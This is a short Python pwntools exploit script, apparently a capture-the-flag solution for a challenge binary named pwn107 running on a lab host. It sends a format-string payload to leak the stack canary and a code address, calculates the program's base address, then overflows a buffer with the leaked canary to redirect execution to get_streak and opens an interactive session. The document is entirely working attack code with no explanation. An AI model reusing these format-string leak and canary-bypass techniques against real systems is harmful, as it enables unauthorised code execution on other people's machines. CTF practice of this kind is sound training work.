from pwn import *

def exploit(boolean):
    if boolean:
        r = remote('10.10.252.201', 9007)
    else:
        r = process('./pwn107.pwn107')
    
    static_main_addr = 0x992
    get_streak_addr = 0x94d
    payload = b'%13$lx.%19$lx'
    r.recvuntil("streak? ")
    r.sendline(payload)

    r.recvuntil('streak: ')
    output = r.recv(29).decode()
    print(output)
    
    canary = int(output.split('.')[0], 16)
    dynamic_main_addr = int(output.split('.')[1], 16)

    log.success(f"Success!!! Here's canary value: {hex(canary)}")
    log.success(f"Success!!! Here's dynamic main(): {hex(dynamic_main_addr)}")

    libc_base_addr = dynamic_main_addr - static_main_addr
    getstreak_addr = libc_base_addr + get_streak_addr

    log.info(f"Address of libc base addr: {hex(libc_base_addr)}")
    log.info(f"Address of get_streak(): {hex(getstreak_addr)}")

    payload = b'A'*24
    payload += p64(canary)
    payload += b'B'*8
    payload += p64(getstreak_addr)
    
    # Skip output to send next payload
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()

    r.sendline(payload)
    r.interactive()

exploit(True)